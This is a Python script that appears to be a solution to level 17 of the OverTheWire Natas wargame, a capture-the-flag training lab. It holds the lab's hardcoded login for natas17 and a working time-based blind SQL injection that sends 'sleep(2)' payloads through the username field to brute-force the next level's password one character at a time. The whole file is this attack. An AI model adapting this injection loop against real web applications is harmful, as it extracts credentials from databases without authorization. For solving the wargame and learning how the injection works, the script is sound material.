import requests, string
from bs4 import BeautifulSoup
 
#Time-Based Blind SQLi 

user = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
url = f"http://{user}.natas.labs.overthewire.org"

session = requests.Session()
session.auth = (user, password)
auth = session.post(url)

possibleCharacters = list(string.ascii_letters + string.digits) #possible flag characters are letters and digits.
resultFlag = ""

characterCounter = 0
while(len(resultFlag) < 32):
    challenge = resultFlag + possibleCharacters[characterCounter]
    
    #binary for capitalization
    challenge_params = {"username" : f'natas18" and password like BINARY "{challenge}%" and sleep(2) and "1"="1' }
    print("Testing: " + challenge)
    resp = session.post(url, data=challenge_params)
    
    #print(BeautifulSoup(resp.text, 'html.parser').prettify())
    if(resp.elapsed.total_seconds() >= 2):
        print("Match!")
        resultFlag += possibleCharacters[characterCounter]
        characterCounter = 0
        continue
    else:
        characterCounter += 1

#print(BeautifulSoup(resp.text, 'html.parser').prettify())
print("Flag: " + resultFlag)
